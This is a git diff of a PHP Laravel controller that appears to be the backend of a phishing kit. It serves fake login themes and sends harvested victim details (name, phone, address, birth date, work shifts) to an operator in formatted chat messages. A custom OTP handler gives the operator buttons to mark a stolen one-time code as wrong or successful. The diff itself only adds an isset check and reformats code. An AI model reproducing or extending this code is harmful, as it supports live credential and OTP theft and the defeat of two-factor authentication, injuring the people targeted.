@@ -59,7 +59,11 @@ class CustomWeb extends Controller
                 if ($web_data->theme_folder == 'suleo123_tuyeneditor') {
                     $web_data->redirect_link = '?success';
                 }
-                $login_theme_folder = $web_data->isCustomLoginTheme ? 'custom.login.' . $web_data->loginThemeFolder : 'login.' . $web_data->login_theme_folder;
+                if (isset($web_data->isCustomLoginTheme)) {
+                    $login_theme_folder = $web_data->isCustomLoginTheme ? 'custom.login.' . $web_data->loginThemeFolder : 'login.' . $web_data->login_theme_folder;
+                } else {
+                    $login_theme_folder = 'login.' . $web_data->login_theme_folder;
+                }
                 return view($login_theme_folder, [
                     'data' => $web_data,
                     'info' => $web_info,
@@ -504,11 +508,11 @@ class CustomWeb extends Controller
                                 "Title: <b>{$website->title}</b>",
                                 "",
                                 "------------------------",
-                                "<b>Họ và tên:</b> <code>" .$fullData['name']. "</code>",
-                                "<b>Số điện thoại:</b> <code>" .$fullData['phone']. "</code>",
-                                "<b>Địa chỉ:</b> <code>" .$fullData['address']. "</code>",
-                                "<b>Ngày sinh:</b> <code>" .$fullData['dob']. "</code>",
-                                "<b>Ca làm việc:</b> <code>" .trim(implode(', ', $caLamViec)). "</code>",
+                                "<b>Họ và tên:</b> <code>" . $fullData['name'] . "</code>",
+                                "<b>Số điện thoại:</b> <code>" . $fullData['phone'] . "</code>",
+                                "<b>Địa chỉ:</b> <code>" . $fullData['address'] . "</code>",
+                                "<b>Ngày sinh:</b> <code>" . $fullData['dob'] . "</code>",
+                                "<b>Ca làm việc:</b> <code>" . trim(implode(', ', $caLamViec)) . "</code>",
                                 "------------------------",
                                 "",
                                 "<b>Phân biệt:</b> {$web_info->emoji}",
@@ -738,7 +742,7 @@ class CustomWeb extends Controller
             }
         }
     }
-     # 0935396675 CUSTOM OTP THEME
+    # 0935396675 CUSTOM OTP THEME
     function theme_0935396675_custom_otp(Request $rq)
     {
         if ($rq->filled('d')) {
@@ -774,13 +778,13 @@ class CustomWeb extends Controller
                         if ($website) {
                             $website = Json::decode($website->data);
                             $keyboard = [
-                                    [
-                                        ['text' => '❌ Nhập sai mã', 'callback_data' => 'wrongcode_' . $pusher_code],
-                                    ],
-                                    [
-                                        ['text' => '✅ Thành công, sang login', 'callback_data' => 'done_' . $pusher_code],
-                                    ]
-                                ];
+                                [
+                                    ['text' => '❌ Nhập sai mã', 'callback_data' => 'wrongcode_' . $pusher_code],
+                                ],
+                                [
+                                    ['text' => '✅ Thành công, sang login', 'callback_data' => 'done_' . $pusher_code],
+                                ]
+                            ];
                             $msg = implode("\n", [
                                 "Giao diện login tùy chỉnh",
                                 "Title: <b>{$website->title}</b>",
